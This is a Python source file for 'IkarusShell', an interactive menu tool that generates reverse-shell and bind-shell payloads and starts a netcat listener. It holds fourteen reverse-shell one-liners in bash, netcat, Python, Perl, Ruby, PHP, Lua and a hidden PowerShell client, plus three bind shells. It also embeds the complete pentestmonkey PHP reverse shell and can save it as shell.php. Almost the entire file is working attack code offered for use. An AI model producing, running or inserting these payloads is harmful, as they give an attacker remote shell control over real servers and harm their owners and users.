#!/usr/bin/env python3

import os
import subprocess

def clear():



    os.system("clear" if os.name == "posix" else "cls")


def banner():
    print("""
\033[94m
╔══════════════════════════════════════════════════════╗
║                                                      ║
║                       __                             ║
║    o                 /' )                            ║
║                    /'   (                        ,   ║
║                __/'     )                      .' `; ║
║ o      _.-~~~~'          ``---..__           .'   ;  ║
║   _.--'  b)                       ``--...__.'   .'   ║
║  (     _.      )).      `-._                   <    ║
║   `\|\|\|\|)-.....___.-     `-.       __...--'-.'.   ║
║     `---......_______,,,`.___.'--... .'       `.;    ║
║                                   `-`         `      ║
║                                                      ║
║                   IkarusShell                        ║
║            By : Abdulaziz Alfailkawi                 ║
║   linkedin.com/in/abdulaziz-al-failakawi-9599a1376   ║
║                                                      ║
╠══════════════════════════════════════════════════════╣
\033[97m║  [1] Reverse Shell Generator                         ║
║  [2] Start Listener                                  ║
║  [3] Bind Shell Generator                            ║
║  [0] Exit                                            ║\033[94m
╚══════════════════════════════════════════════════════╝
\033[0m
""")


def get_ip_port():
    lhost = input("\n[?] LHOST > ").strip()
    lport = input("[?] LPORT > ").strip()
    return lhost, lport

def generate_php_full_shell(lhost, lport):
    php_shell = '''<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only. Users take full responsibility
// for any actions performed using this tool. The author accepts no liability
// for damage caused by this tool. If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only. Users take full responsibility
// for any actions performed using this tool. If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix). These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '###LHOST###';
$port = ###LPORT###;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise. This is quite common and not fatal.");
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\\n";
	}
}
?>'''

    php_shell = php_shell.replace("###LHOST###", lhost)
    php_shell = php_shell.replace("###LPORT###", str(lport))
    return php_shell

def reverse_shell_menu(lhost, lport):
    shells = {
        "1":  ("Bash -i", f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
        "2":  ("Bash 196", f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196"),
        "3":  ("Bash read line", f"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done"),
        "4":  ("Bash 5", f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"),
        "5":  ("Netcat OpenBSD", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"),
        "6":  ("Netcat Traditional", f"nc -e /bin/sh {lhost} {lport}"),
        "7":  ("Netcat BusyBox", f"nc {lhost} {lport} -e /bin/sh"),
        "8":  ("Python3", f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
        "9":  ("Python2", f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"),
        "10": ("PHP One-liner", f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        "11": ("Perl", f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"),
        "12": ("Ruby", f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
        "13": ("PowerShell", f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""),
        "14": ("Lua", f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""),
        "15": ("PHP Full Reverse Shell (Pentest Monkey)", "FULL_PHP"),
    }

    print("\n\033[93m[+] Reverse Shells:\033[0m\n")
    for key, (name, _) in shells.items():
        print(f"  [{key}] {name}")

    choice = input("\n[?] Choose option > ").strip()

    if choice == "15":
        php_code = generate_php_full_shell(lhost, lport)
        print("\n\033[92m[+] PHP Full Reverse Shell (Pentest Monkey):\033[0m\n")
        print("-" * 70)
        print(php_code)
        print("-" * 70)

        save = input("\n[?] Do you want to save it to a file? (y/n) > ").strip().lower()
        if save == "y":
            filename = input("[?] Filename (default: shell.php) > ").strip()
            if not filename:
                filename = "shell.php"
            with open(filename, "w") as f:
                f.write(php_code)
            print(f"\n\033[92m[+] Saved successfully as: {filename}\033[0m")
    elif choice in shells:
        name, payload = shells[choice]
        print(f"\n\033[92m[+] {name}:\033[0m\n")
        print("-" * 70)
        print(payload)
        print("-" * 70)
    else:
        print("\n\033[91m[-] Invalid option\033[0m")

def start_listener():
    port = input("\n[?] Port for Listener > ").strip()
    print(f"\n\033[92m[+] Starting Listener on port {port}...\033[0m")
    print("\033[93m[!] Press Ctrl+C to stop the listener\033[0m\n")
    try:
        subprocess.run(["nc", "-lvnp", port])
    except FileNotFoundError:
        print("\n\033[91m[-] netcat (nc) is not installed.\033[0m")
        print("[!] Install it using: sudo apt install netcat-traditional")
    except KeyboardInterrupt:
        print("\n\n\033[93m[!] Listener stopped.\033[0m")

def bind_shell_menu(lport):
    shells = {
        "1": ("Netcat", f"nc -nlvp {lport} -e /bin/sh"),
        "2": ("Python3", f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{lport}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
        "3": ("Python2", f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{lport}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"),
    }

    print("\n\033[93m[+] Bind Shells:\033[0m\n")
    for key, (name, _) in shells.items():
        print(f"  [{key}] {name}")

    choice = input("\n[?] Choose option > ").strip()

    if choice in shells:
        name, payload = shells[choice]
        print(f"\n\033[92m[+] {name}:\033[0m\n")
        print("-" * 70)
        print(payload)
        print("-" * 70)
    else:
        print("\n\033[91m[-] Invalid option\033[0m")

def main():
    while True:
        clear()
        banner()
        choice = input("[?] Select option > ").strip()

        if choice == "1":
            lhost, lport = get_ip_port()
            reverse_shell_menu(lhost, lport)
            input("\n[!] Press Enter to continue...")
        elif choice == "2":
            start_listener()
            input("\n[!] Press Enter to continue...")
        elif choice == "3":
            lport = input("\n[?] LPORT > ").strip()
            bind_shell_menu(lport)
            input("\n[!] Press Enter to continue...")
        elif choice == "0":
            print("\n\033[92m[+] Goodbye\033[0m\n")
            break
        else:
            print("\n\033[91m[-] Invalid option\033[0m")
            input("\n[!] Press Enter to continue...")

if __name__ == "__main__":
    main()
